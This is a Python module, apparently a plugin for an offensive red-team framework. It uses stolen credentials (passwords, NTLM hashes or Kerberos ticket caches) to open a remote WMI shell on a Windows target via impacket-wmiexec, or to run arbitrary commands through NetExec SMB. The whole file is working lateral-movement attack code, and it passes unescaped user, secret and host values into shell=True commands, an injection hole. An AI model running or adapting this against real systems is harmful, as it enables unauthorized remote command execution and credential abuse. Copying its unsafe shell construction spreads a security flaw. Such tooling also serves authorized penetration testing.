def run(data, cred, args):
    

    import subprocess
    import os

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    ip = data.get("ip")
    domain = data.get("domain")

    if not ip:

        print("[!] No target IP set")
        return

    if not cred:

        print("[!] No credentials available")
        return

    user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret") or cred.get("ccache")

    hostname = (
        data.get("hostname")
        or data.get("name")
    )

    fqdn = (
        f"{hostname}.{domain}"
        if domain
        else hostname
    )

    cmd_input = getattr(
        args,
        "cmd",
        None
    )

    base_cmd = None

    #
    # PASSWORD
    #

    if typ == "password":

        if domain:

            target = (
                f"{domain}/"
                f"{user}:"
                f"{secret}@"
                f"{ip}"
            )

        else:

            target = (
                f"{user}:"
                f"{secret}@"
                f"{ip}"
            )

        base_cmd = (
            f"impacket-wmiexec "
            f"{target}"
        )

    #
    # NTLM
    #

    elif typ == "ntlm":

        if domain:

            target = (
                f"{domain}/"
                f"{user}@"
                f"{ip}"
            )

        else:

            target = (
                f"{user}@"
                f"{ip}"
            )

        base_cmd = (
            f"impacket-wmiexec "
            f"-hashes "
            f":{secret} "
            f"{target}"
        )

    #
    # KERBEROS
    #

    elif typ == "ticket":

        env = os.environ.copy()

        env["KRB5CCNAME"] = secret

        base_cmd = (
            f"impacket-wmiexec "
            f"{domain}/{user}@{fqdn} "
            f"-k "
            f"-no-pass"
        )

    else:

        print(
            f"{R}[!] Unsupported credential type: {typ}"
        )

        return

    #
    # COMMAND MODE
    #

    if cmd_input:

        import shlex

        safe_cmd = shlex.quote(
            cmd_input
        )

        if typ == "password":

            full_cmd = (
                f"nxc smb {ip} "
                f"-u {user} "
                f"-p '{secret}' "
                f"-x {safe_cmd} "
                f"--no-progress"
            )

        elif typ == "ntlm":

            full_cmd = (
                f"nxc smb {ip} "
                f"-u {user} "
                f"-H {secret} "
                f"-x {safe_cmd} "
                f"--no-progress"
            )

        elif typ == "ticket":

            full_cmd = (
                f"nxc smb {fqdn} "
                f"-u {user} "
                f"--use-kcache "
                f"-x {safe_cmd} "
                f"--no-progress"
            )

        else:

            return


        print(
            f"{G}[+] Running: {Y}{full_cmd}{W}"
        )

        result = subprocess.run(
            full_cmd,
            shell=True,
            capture_output=True,
            text=True
        )

        print(
            result.stdout
        )

        if result.stderr:

            print(
                result.stderr
            )

        return

    #
    # INTERACTIVE MODE
    #

    print(
        f"{W}[*] {W}Running: {Y}{base_cmd}{W}"
    )

    print(
        f"{G}[+] Opening interactive WMI shell...{W}\n"
    )

    if typ == "ticket":

        subprocess.run(
            base_cmd,
            shell=True,
            env=env
        )

    else:

        subprocess.run(
            base_cmd,
            shell=True
        )
